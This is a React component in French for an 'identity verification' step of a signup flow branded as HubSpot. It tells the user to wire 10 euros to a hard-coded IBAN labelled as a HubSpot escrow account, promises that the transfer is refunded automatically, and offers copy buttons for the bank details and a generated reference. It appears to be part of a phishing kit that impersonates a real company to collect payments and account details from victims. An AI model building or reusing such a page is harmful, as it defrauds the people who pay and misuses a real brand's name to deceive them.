import { useState } from 'react'
import styles from '../../styles/Step.module.css'
import { CopyIcon, ChevronDownIcon } from '../Icons'

export default function StepVerification({ data, onSubmit, onNext }) {
  const [copiedField, setCopiedField] = useState(null)
  const [showBankDetails, setShowBankDetails] = useState(false)
  const companyInfo = data?.companyInfo || { name: 'HubSpot' }

  // Générer un code de référence unique pour le virement
  const generateReferenceCode = () => {
    return `HSP-${Date.now().toString().slice(-8)}`
  }

  const referenceCode = generateReferenceCode()

  const bankDetails = {
    iban: 'FR7616598000014000100094658',
    bic: 'FPELFR21XXX',
    titulaire: 'HubSpot - Compte Séquestre',
    montant: '10,00 €',
    reference: referenceCode
  }

  const copyToClipboard = async (text, fieldName) => {
    try {
      await navigator.clipboard.writeText(text)
      setCopiedField(fieldName)
      setTimeout(() => setCopiedField(null), 2000)
    } catch (err) {
      console.error('Erreur lors de la copie:', err)
    }
  }

  return (
    <form className={styles.stepForm}>
      <div className={styles.stepHeader}>
        <h1 className={styles.stepTitle}>Vérifiez votre identité</h1>
        <p className={styles.stepDescription}>
          Pour finaliser votre inscription, nous devons vérifier votre identité. 
          Cette étape est simple, sécurisée et ne prend que quelques minutes.
        </p>
      </div>

      <div className={styles.verificationContent}>
        <div className={styles.verificationSteps}>
          <div className={styles.verificationStep}>
            <div className={styles.stepNumber}>1</div>
            <div className={styles.stepContent}>
              <p className={styles.stepText}>
                Effectuez un virement de <strong>{bankDetails.montant}</strong> vers notre compte séquestre de vérification.
              </p>
              <p className={styles.stepSubtext}>
                Ce virement est temporaire et sera automatiquement remboursé après vérification. 
                Il sert uniquement à confirmer votre identité.
              </p>
              <button
                type="button"
                onClick={() => setShowBankDetails(!showBankDetails)}
                className={styles.toggleButton}
                aria-expanded={showBankDetails}
              >
                <span>Afficher les informations</span>
                <ChevronDownIcon className={`${styles.chevronIcon} ${showBankDetails ? styles.chevronRotated : ''}`} />
              </button>
              {showBankDetails && (
                <div className={styles.bankDetailsExpanded}>
                  <div className={styles.bankInfoInline}>
                    <div className={styles.bankInfoItem}>
                      <span className={styles.bankInfoLabel}>IBAN</span>
                      <div className={styles.bankInfoValueWrapper}>
                        <span className={styles.bankInfoValue}>{bankDetails.iban}</span>
                        <button
                          type="button"
                          onClick={() => copyToClipboard(bankDetails.iban, 'iban')}
                          className={styles.copyButton}
                          aria-label="Copier l'IBAN"
                        >
                          <CopyIcon className={styles.copyIcon} />
                          {copiedField === 'iban' && <span className={styles.copiedText}>Copié</span>}
                        </button>
                      </div>
                    </div>
                    <div className={styles.bankInfoItem}>
                      <span className={styles.bankInfoLabel}>BIC</span>
                      <div className={styles.bankInfoValueWrapper}>
                        <span className={styles.bankInfoValue}>{bankDetails.bic}</span>
                        <button
                          type="button"
                          onClick={() => copyToClipboard(bankDetails.bic, 'bic')}
                          className={styles.copyButton}
                          aria-label="Copier le BIC"
                        >
                          <CopyIcon className={styles.copyIcon} />
                          {copiedField === 'bic' && <span className={styles.copiedText}>Copié</span>}
                        </button>
                      </div>
                    </div>
                    <div className={styles.bankInfoItem}>
                      <span className={styles.bankInfoLabel}>Titulaire</span>
                      <div className={styles.bankInfoValueWrapper}>
                        <span className={styles.bankInfoValue}>{bankDetails.titulaire}</span>
                        <button
                          type="button"
                          onClick={() => copyToClipboard(bankDetails.titulaire, 'titulaire')}
                          className={styles.copyButton}
                          aria-label="Copier le titulaire"
                        >
                          <CopyIcon className={styles.copyIcon} />
                          {copiedField === 'titulaire' && <span className={styles.copiedText}>Copié</span>}
                        </button>
                      </div>
                    </div>
                    <div className={styles.bankInfoItem}>
                      <span className={styles.bankInfoLabel}>Référence / Libellé</span>
                      <div className={styles.bankInfoValueWrapper}>
                        <span className={styles.bankInfoValue}>{bankDetails.reference}</span>
                        <button
                          type="button"
                          onClick={() => copyToClipboard(bankDetails.reference, 'reference')}
                          className={styles.copyButton}
                          aria-label="Copier la référence"
                        >
                          <CopyIcon className={styles.copyIcon} />
                          {copiedField === 'reference' && <span className={styles.copiedText}>Copié</span>}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>

          <div className={styles.stepSeparator}></div>

          <div className={styles.verificationStep}>
            <div className={styles.stepNumber}>2</div>
            <div className={styles.stepContent}>
              <p className={styles.stepText}>
                Vérification de votre identité.
              </p>
              <p className={styles.stepSubtext}>
                Dès lors l'ordre de virement soumis, notre système vérifie le compte émetteur et confirme votre identité.
              </p>
            </div>
          </div>

          <div className={styles.stepSeparator}></div>

          <div className={styles.verificationStep}>
            <div className={styles.stepNumber}>3</div>
            <div className={styles.stepContent}>
              <p className={styles.stepText}>
                Annulation de la transaction.
              </p>
              <p className={styles.stepSubtext}>
                En cas de virement instantané, comptez 2 à 5 minutes. 
                Sinon, sous 12 à 24 heures.
              </p>
            </div>
          </div>
        </div>
      </div>

      <div className={styles.automaticNotice}>
        <p className={styles.noticeText}>
          Une fois la vérification effectuée, votre compte sera automatiquement activé et vous serez redirigé vers votre espace personnel.
        </p>
      </div>
    </form>
  )
}
